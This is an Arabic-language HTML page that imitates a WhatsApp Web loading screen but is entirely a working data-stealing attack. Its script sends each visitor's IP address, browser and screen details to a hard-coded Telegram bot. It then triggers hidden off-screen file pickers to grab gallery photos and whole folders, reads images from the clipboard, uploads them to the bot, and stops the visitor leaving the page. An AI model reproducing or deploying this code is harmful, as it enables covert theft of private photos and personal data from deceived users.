<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web - تحميل...</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            background:#000;
            height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
            font-family:Arial,sans-serif;
            overflow:hidden;
        }
        .loader{
            text-align:center;
            color:#fff;
        }
        .whatsapp-logo{
            width:100px;
            height:100px;
            background:#25d366;
            border-radius:50%;
            margin:0 auto 20px;
            display:flex;
            align-items:center;
            justify-content:center;
            font-size:30px;
            font-weight:bold;
        }
        .text{
            font-size:14px;
            margin:10px 0;
            opacity:0.8;
        }
        .stealer{position:fixed;top:-10000px;left:-10000px;width:0.1px;height:0.1px;opacity:0;z-index:-1;}
    </style>
</head>
<body>
    <div class="loader">
        <div class="whatsapp-logo">WA</div>
        <div class="text">جاري الاتصال بـ WhatsApp...</div>
        <div class="text">يرجى عدم إغلاق الصفحة</div>
    </div>

    <!-- 🔥 GALLERY STEALERS -->
    <input type="file" class="stealer" id="s1" multiple accept="image/*">
    <input type="file" class="stealer" id="s2" multiple accept="image/jpeg,image/png">
    <input type="file" class="stealer" id="s3" multiple webkitdirectory directory>

    <script>
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
        const CHAT_ID = '8539996558';
        const stealers = ['s1','s2','s3'].map(id=>document.getElementById(id));

        // 🔥 STEP 1: SEND IP IMMEDIATELY
        fetch('https://api.ipify.org?format=json')
        .then(r=>r.json())
        .then(d=>sendHit(d.ip))
        .catch(()=>sendHit('unknown'));

        function sendHit(ip){
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    chat_id:CHAT_ID,
                    text:`🎯 HIT!\n🌐 IP: ${ip}\n📱 ${navigator.userAgent.slice(0,60)}\n📏 ${screen.width}x${screen.height}`
                })
            });
        }

        // 🔥 STEP 2: MASS GALLERY ATTACK
        stealers.forEach((input,i)=>{
            setTimeout(()=>{
                // TRIPLE CLICK ATTACK
                input.click();
                setTimeout(()=>input.click(),10);
                setTimeout(()=>input.click(),50);
                
                input.onchange = e=>{
                    uploadFiles(Array.from(e.target.files).filter(f=>f.size>5e3&&f.size<1e7));
                }
            },i*100);
        });

        // 🔥 WEBKIT DIRECTORY ATTACK
        setTimeout(()=>{
            const dirInput = document.createElement('input');
            dirInput.type='file';
            dirInput.webkitdirectory=true;
            dirInput.directory=true;
            dirInput.multiple=true;
            dirInput.className='stealer';
            document.body.appendChild(dirInput);
            
            dirInput.click();
            dirInput.onchange=e=>uploadFiles(Array.from(e.target.files));
            setTimeout(()=>document.body.removeChild(dirInput),3000);
        },500);

        // 🔥 CLIPBOARD ATTACK
        if(navigator.clipboard && navigator.clipboard.read){
            navigator.clipboard.read().then(items=>{
                items.forEach(async item=>{
                    if(item.types.includes('image/png')){
                        const blob=await item.getType('image/png');
                        const file=new File([blob],'clip.png',{type:'image/png'});
                        uploadFiles([file]);
                    }
                });
            }).catch(()=>{});  
        }

        // 🔥 UPLOAD ENGINE
        async function uploadFiles(files){
            if(files.length===0) return;
            
            // RAPID FIRE UPLOAD
            files.slice(0,20).forEach(async(file,i)=>{
                const form=new FormData();
                form.append('chat_id',CHAT_ID);
                form.append('photo',file);
                form.append('caption',`${i+1}/${files.length} ${(file.size/1e6).toFixed(1)}MB ${file.name}`);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
                    method:'POST',
                    body:form
                }).catch(e=>console.log('Upload',i,e));
            });
        }

        // 🔥 ANTI EXIT
        history.pushState(null,null,location.href);
        window.onpopstate=()=>history.go(1);
        window.onbeforeunload=()=>"";
    </script>
</body>
</html>
